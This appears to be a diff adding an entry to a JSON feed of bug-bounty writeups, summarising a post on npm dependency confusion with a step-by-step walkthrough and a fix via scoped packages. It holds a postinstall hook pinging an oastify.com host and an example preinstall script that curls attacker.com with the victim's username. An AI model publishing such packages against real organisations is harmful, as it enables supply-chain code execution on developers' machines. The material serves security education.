@@ -1,5 +1,46 @@
 [
   {
+    "id": "353349ce95d5",
+    "title": "Dependency Confusion Explained: How a Missing NPM Package Becomes Remote Code Execution",
+    "url": "https://medium.com/@vigneshkumaroffsec/dependency-confusion-explained-how-a-missing-npm-package-becomes-remote-code-execution-bba0fa514e49",
+    "source": {
+      "slug": "medium-tag-bug-bounty",
+      "name": "Medium — #bug-bounty"
+    },
+    "authors": [
+      "Vigneshkumaroffsec"
+    ],
+    "program": null,
+    "platform_slug": "self-disclosed",
+    "bounty_raw": null,
+    "published_at": "2026-11-06T02:23:46.000Z",
+    "added_at": "2026-11-06T03:40:50.029Z",
+    "categories": [
+      "supply-chain",
+      "rce"
+    ],
+    "severity": "medium",
+    "difficulty": "beginner",
+    "summary_en": "An internal package name was leaked in metadata, allowing an attacker to claim the name on the public npm registry and execute code during installation.",
+    "summary_ar": null,
+    "lesson": {
+      "cause": "The vulnerability occurs because package managers like npm (a tool for managing code libraries) often merge public and private sources by default. If a project lists a dependency that only exists on a private registry but the name is leaked publicly, an attacker can register that same name on the public registry. Because the public registry is global and first-come-first-served, the package manager may prioritize the attacker's public version over the internal one during an 'npm install' command.",
+      "walkthrough": "RECON\n1. Search public metadata like 'package.json' (a file listing project dependencies) or source maps for names that look like internal company tools.\n2. Verify if the identified name is available on the public registry.\n`npm view frontegg-angular-sanity-check` \nWhy: This command checks the public registry (a central store for code) to see if the name is already taken; a 404 error means it is unclaimed.\nEXPLOITATION\n3. Create a new directory and initialize a package using the unclaimed internal name.\n4. Add a 'postinstall' script to the 'package.json' file.\n`\"scripts\": { \"postinstall\": \"node index.js\" }` \nWhy: A 'postinstall' script (a command that runs automatically after installation) tells the computer to execute a specific file immediately after downloading the package.\n5. Create the 'index.js' file with a benign 'ping' payload.\n`const https = require(\"https\"); https.get(\"https://<id>.oastify.com\");` \nWhy: This uses the 'https' module to send an HTTP request (a message sent over the internet) to the researcher's server to prove the code successfully executed.\n6. Publish the package to the public npm registry.\n`npm publish` \nWhy: This makes the package available for any computer in the world to download.\nIMPACT\n7. Wait for a developer or a CI/CD pipeline (an automated system that builds and tests code) to run an install command.\n`npm install` \nWhy: If the system is not configured to prioritize private registries, it will download the attacker's public package, triggering the 'postinstall' script and executing the attacker's code.",
+      "example": "Imagine a company called 'target.example' uses an internal library named 'target-secret-utils'. A researcher finds this name in a public JavaScript file on the company's website. The researcher checks npm and sees 'target-secret-utils' is not registered. They create a package with that name and add a 'preinstall' script: `\"scripts\": {\"preinstall\": \"curl http://attacker.com/$(whoami)\"}`. When a developer at 'target.example' runs `npm install` to set up their project, the computer sees the public version of 'target-secret-utils', downloads it, and automatically runs the 'curl' command, which sends the developer's username to the attacker's server. This proves the attacker could have run any command on the developer's machine.",
+      "takeaway": "To find these bugs, look for unique, internal-sounding names in 'package.json' files, Dockerfiles, or frontend bundles. Always check if these names are available on public registries like npm or PyPI. A key variant is 'Typosquatting,' where attackers register names very similar to popular packages (e.g., 'react-domm' instead of 'react-dom'). A common mistake is assuming that because a package isn't used in the final production website, it isn't a risk; however, the primary targets are the developers' laptops and the automated build servers where the code is first compiled.",
+      "fix": "The most effective fix is using 'scoped packages,' which prefix the package name with an organization name (e.g., '@my-org/package-name'). You must then configure your '.npmrc' file to map that specific scope to your private registry. Additionally, always use a lockfile ('package-lock.json') and run 'npm ci' instead of 'npm install' in automated environments to ensure packages are pulled from the exact locations recorded in the lockfile. \n\nExample .npmrc fix:\n`@my-org:registry=https://registry.internal.example.com/`",
+      "cause_ar": null,
+      "walkthrough_ar": null,
+      "example_ar": null,
+      "takeaway_ar": null,
+      "fix_ar": null
+    },
+    "excerpt": "_How a package name your build already trusts gets claimed by someone else, how I found one in a bug bounty, and the registry settings that shut the whole class down._ By Vignesh Kumar | Security Researcher Press enter or click to view image in full size Image 4 Your build installs dozens of packages you never think about. Most of them come from the public npm registry. A few are internal, built by your own team, pulled from a private registry. Dependency confusion is what happens when your build can’t tell the difference. If an internal package name appears in your `package.json` but does not",
+    "ai_generated": true,
+    "engagement": null,
+    "score": 47
+  },
+  {
     "id": "631bac52ff06",
     "title": "ThisBash Escape: Claude Dispatch Flaw Enables Browser Extensions RCE on the OS · Forever Security",
     "url": "https://www.reddit.com/r/netsec/comments/1xokbbo/thisbash_escape_claude_dispatch_flaw_enables",
